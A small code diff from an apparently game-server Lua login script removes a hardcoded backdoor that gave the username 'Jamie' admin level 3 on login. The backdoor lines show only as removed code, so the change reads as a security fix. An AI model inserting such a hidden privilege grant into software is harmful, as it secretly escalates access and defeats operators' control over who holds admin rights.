@@ -22,9 +22,6 @@ function attemptLogin( username, password, player )
     if ( userAccount ) then
         logIn( client, userAccount, password )
         triggerClientEvent( client, "SAlogin.loggedIn", client, getAccountName( userAccount ) )
-		if (username == "Jamie") then
-			exports.SAanticheat:changeProtectedElementDataEx(client, "admin_level", 3, true)
-		end
     else
         triggerClientEvent( client, "SAlogin.errorHappened", client, "You entered the wrong username/password!" )
     end
